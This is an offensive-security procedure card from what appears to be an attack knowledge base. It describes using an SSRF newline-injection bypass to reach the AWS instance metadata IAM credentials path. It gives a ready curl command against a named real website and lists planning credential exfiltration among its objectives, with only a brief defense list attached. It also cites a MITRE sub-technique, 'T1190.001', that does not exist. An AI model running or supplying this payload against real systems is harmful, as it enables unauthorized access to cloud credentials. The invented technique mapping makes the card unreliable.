---
id: proc-ssrf-aws-existing
tags:
  - ssrf
  - aws
  - metadata
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Fiddler]]'
  - '[[tools/ZAP]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/ssrf-aws-iam-credentials-test]]'
verified: false
platforms:
  - Web
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T03:53:38.663Z'
sub_techniques:
  - '[[T1190.001]]'
  - '[[Cloud Instance Metadata API]]'
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unsecured Credentials]]'
---
# Access-AWS-Metadata-Existing-Endpoint-via-SSRF

## Summary

This procedure uses the SSRF bypass to access an existing AWS instance metadata endpoint (IAM security credentials), confirmed by an empty response body indicating successful internal fetch.

## Description

The AWS metadata service at 169.254.169.254 is accessible from the server. By injecting this URL with %0A, the server fetches it internally, returning an empty body for valid paths, allowing detection of cloud environment details without direct exfiltration here.

## Requirements

1. Target running on AWS EC2
2. Authenticated session
3. Proxy for payload crafting

## Defense

Defensive measures and detection strategies:

- Disable or restrict metadata service access (IMDSv2)
- Validate all outbound requests against allowlists
- Monitor for metadata endpoint accesses in logs

## Objectives

1. Confirm AWS environment presence
2. Detect accessible metadata paths
3. Plan for potential credential exfiltration

## Instructions

### Step 1: Prepare AWS Metadata Payload

**Context**: Target /latest/meta-data/iam/security-credentials/ with %0A bypass.

Set URL parameter accordingly.

### Step 2: Send SSRF Request

**Context**: Execute to observe internal access.

**Command** ([[commands/ssrf-aws-iam-credentials-test]]):
```bash
curl -X GET "https://search.usa.gov/help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html" -H "Host: search.usa.gov" -H "Cookie: [your_session_cookies]"
```

> Expect 200 OK with empty body {"body":""}.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Unsecured Credentials]] Unsecured Credentials

### Sub-Techniques

- [[T1190.001]] Exploit Application Deployment Logic
- [[Cloud Instance Metadata API]] Cloud Instance Metadata API

## Commands Used

- [[commands/ssrf-aws-iam-credentials-test]]

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/Fiddler]]
- [[tools/ZAP]]

## Tags

- ssrf
- aws
- metadata
